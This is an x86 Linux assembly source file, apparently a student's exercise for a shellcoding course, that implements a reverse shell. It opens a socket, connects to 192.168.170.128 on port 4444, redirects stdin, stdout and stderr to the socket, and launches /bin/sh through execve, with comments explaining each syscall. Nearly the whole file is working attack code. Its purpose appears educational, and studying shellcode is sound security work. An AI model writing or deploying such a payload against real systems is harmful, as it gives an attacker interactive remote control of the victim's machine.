;Filename: reverseShell.nasm
;Author: Jonathan So
;Student ID: SLAE-1470
;SLAE-Exercise 2

global _start

section .text

_start:
;First, we will need to create a socket		
;
;  socketcall(int call, socket(int domain, int type, int protocol)
;  eax:		ebx:    			ecx:
;  0x66		call = 0x1 (SYS_SOCKET)		*args = {domain = 0x2 (AF_INET), type = 0x1 (SOCK_STREAM), protocol = 0x0 (Single Protocol)}
;	
	xor ebx,ebx	; init register
	mul ebx		; this actually seems to set both eax and edx to 0
	push ebx	; 0x0 for protocol
	inc ebx		
	push ebx	; 0x1 for SOCK_STREAM
	push byte +0x2	; 0x2 for AF_INET
	mov ecx,esp	; ecx points to addr of current stack
	mov al,0x66	; 0x66 systemcall for socketcall
	int 0x80

	mov esi, eax	; We need to backup our eax because unlike our bind shell, we cannot get it from eax after connect

;Then we will need to set up connect() to connect to remote host
;
;  socketcall(int call, connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen))
;  eax:		ebx:				ecx:
;  0x66		call = 0x3 (SYS_CONNECT)	*args = {sockfd = socketid = eax, sockaddr = [0x2 (AF_INET), port = 115C (4444), address = 192.168.170.128], addrlen = 0x10}
;
	xor ebx,ebx
	mov bl, 0x3	; 0x3 for SYS_CONNECT
	;push dword 0x80AAA8C0	; Our ip address 192.168.170.128
	; We will be using edx, it is 0x0 at this point
	mov dl,0x80
	SHL EDX,0x8	;move edx to left by one byte
	mov dl,0xAA
	SHL EDX,0x8	;move edx to left by one byte
	mov dl,0xA8
	SHL EDX,0x8	;move edx to left by one byte
	mov dl,0xC0
	push edx
	push word 0x5c11; 115c is 4444 in hexadecimal form
	push word 0x02
	mov ecx,esp	; Store the address of sockaddr to ecx
	push byte 0x10
	push ecx	; push the address that store value of sockaddr to stack
	push esi	; eax was set to the value of socketid after the socket call 
	mov ecx,esp	; ecx points to addr of current stack
	push byte 0x66  ; 0x66 systemcall for socketcall
	pop eax
	int 0x80

;Now, its time for us to redirect all file descriptor we need so that our input and output to the shell 
;will be handled by stdin(0), stdout(1) and stderr(2)
;
;  dup2(int oldfd, int newfd, int flags)
;  eax:		ebx:			ecx:
;  0x3f		oldfd = socketid	newfd = stdin(0), stdout(1) and stderr(2)
;
	xchg esi,ebx
	xor ecx,ecx
	mov cl, 0x2
loop:				; Since we got three fd, we will use loop 3 times
	mov al, 0x3f		; 0x3f systemcall for dup2
	int 0x80
	dec ecx			; 2 > 1 > 0
	jns loop

;At last, the final part, this one is rather easy as we only need to call /bin/sh with execve()
;
;  execve(const char *filename, char *const argv[],char *const envp[])
;  eax:		ebx:			ecx:			edx:
;  0xb		*filename = /bin//sh	address of /bin//sh	0x0
;
	xor edx,edx
	push edx		; set the end of /bin//sh to 0x0
	push dword 0x68732f2f
	push dword 0x6e69622f	; /bin//sh
	mov ebx,esp
	push eax		; eax was set to 0x0 after dup2 and we can use it directly
	push ebx		
	mov ecx,esp
	mov al,0xb		; 0xb systemcall for execve
	int 0x80
